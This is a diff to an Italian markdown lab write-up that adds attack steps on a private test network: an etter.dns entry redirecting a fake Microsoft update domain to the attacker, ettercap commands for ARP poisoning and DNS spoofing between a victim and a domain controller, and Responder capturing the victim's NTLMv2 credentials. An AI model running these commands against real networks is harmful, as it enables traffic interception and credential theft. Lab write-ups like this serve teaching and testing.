@@ -72,7 +72,29 @@ Da questa fase di 'enumerazione' si recuperano le seguenti informazioni:
 
  ![qui](Sito_Microsoft_Fasullo.jpg)
 
-[testo](https://)
-1. first
-2. second
-3. third
+#### Passo 5 - Configurazione ed avvio del DNS-Spoofing ####
+Per effettuare il DNS-Spoofing e reindirizzare la *vittima* sulla macchina *attaccante* si è utilizzato il software **ettercap**. Per la configurazione è stato modificato il file di configurazione denominato "**etter.dns**" al quale è stata aggiunta una riga a fine file contenente l'indirizzo internet 'fasullo' e la destinazione alla quale deve 'puntare' (IP attaccante = 10.0.0.7).
+
+`www.criticalupdate.technet.microsoft.com     10.0.0.7`
+
+Avvio prima sessione **ettercap**:
+
+`sudo ettercap -T -q -i eth0 -M arp:remote /10.0.0.1// /10.0.0.100//`
+
+- Il comando completo avvia ettercap per eseguire un attacco di avvelenamento ARP (ARP poisoning) in modalità testo e in modo silenzioso sulla rete specificata dall'interfaccia eth0. L'attacco viene eseguito tra i due host specificati (10.0.0.1 [vittima] e 10.0.0.100 [domain controller]), permettendo a ettercap di intercettare il traffico tra questi due host. In pratica, ettercap convince ciascuno degli host che l'attaccante è l'altro host, reindirizzando così il traffico attraverso l'attaccante, che può poi analizzare, modificare o registrare i dati trasmessi.
+
+Avvio seconda sessione **ettercap**: 
+
+`sudo ettercap -T -q -i eth0 dns_spoof`
+* Il plugin **dns_spoof** intercetta le richieste DNS che passano attraverso la rete. Quando una richiesta DNS viene intercettata, **ettercap** risponde con una risposta falsa, reindirizzando il traffico verso un indirizzo IP specificato dall'*attaccante*.
+
+#### Passo 7 - Cattura delle credenziali dell *vittima* con RESPONDER ####
+Sulla macchina *attaccante* si avvia il software **responder**:
+
+`sudo responder -i eth0 -A`
+
+* In questa modalità, Responder raccoglie informazioni sulle richieste di risoluzione dei nomi che osserva, registrando quali servizi e host sono richiesti sulla rete. Questo può includere richieste per protocolli come LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), e MDNS (Multicast DNS).
+
+Nel momento in cui la *vititma* 'clicca' sul pulsante 'Download' (che in realtà punta alla macchina *attaccante*) **responder** cattura le credenziali **NTLMv2** della *vittima*:
+
+![responder](Responder.jpg)
